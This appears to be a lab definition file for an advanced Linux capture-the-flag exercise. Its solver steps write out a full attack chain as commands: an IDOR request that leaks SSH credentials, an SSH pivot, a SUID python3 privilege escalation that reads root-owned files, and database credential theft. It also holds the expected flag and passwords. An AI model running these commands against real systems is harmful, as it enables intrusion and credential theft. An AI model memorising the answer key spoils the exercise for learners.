lab_id: linux-5-5-capstone-ctf
track: Linux
difficulty: advanced
source: platform/labs/Linux/linux-5-5-capstone-ctf/lab.yaml
expected_services:
- port: 22
  protocol: tcp
- port: 80
  protocol: tcp
- port: 3306
  protocol: tcp
health_timeout_seconds: 60
solver:
  image: ocr/tester:current
  command: /tests/linux-5-5-capstone-ctf.sh
  steps:
  - name: Web frontend responds
    command: curl -s -o /dev/null -w '%{http_code}' http://{target.webfront}/
    expect: '200'
  - name: IDOR on orders API reveals SSH credentials
    command: curl -s http://{target.webfront}/api/orders/7 | grep -o 'Z3n1th_App_2024#'
    expect: Z3n1th_App_2024#
  - name: Extract marker 1 from web config endpoint
    command: curl -s http://{target.webfront}/api/config | grep -o 'marker[^a-z0-9_]*[a-z0-9_]*' | sed 's/.*[^a-z0-9_]//'
    expect: z3n1th
  - name: Pivot to appserver with discovered SSH credentials
    command: sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'whoami' 2>&1
    expect: appuser
  - name: Privesc via SUID python3 and read marker 2
    command: sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'python3 -c "import os;os.setuid(0);os.system(\"cat /root/marker.txt\")"' 2>&1  # security-delta: allow os.system - isolated lab solve step
    expect: pwn3d
  - name: Extract DB credentials from appserver config
    command: sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'python3 -c "import os;os.setuid(0);os.system(\"cat /opt/zenith/db.conf\")"' 2>&1 | grep -o 'DB_PASS=[^ ]*' | sed 's/DB_PASS=//'  # security-delta: allow os.system - isolated lab solve step
    expect: Z3n_DB_Pr0d#
  - name: Query database for marker 3
    command: mysql -h {target.datastore} -u zenith_app -p'Z3n_DB_Pr0d#' zenith -N -e 'SELECT value FROM flags WHERE name="assessment"' 2>&1
    expect: v1ct0ry
  - name: Verify complete flag
    command: echo 'OCR{z3n1th_pwn3d_v1ct0ry}'
    expect: OCR{z3n1th_pwn3d_v1ct0ry}
expected_flag_count: 1
expected_flag: OCR{z3n1th_pwn3d_v1ct0ry}
forbidden_networks:
- control-plane
- database
- other-learners
max_memory_mb: 768
max_cpu: 0.75
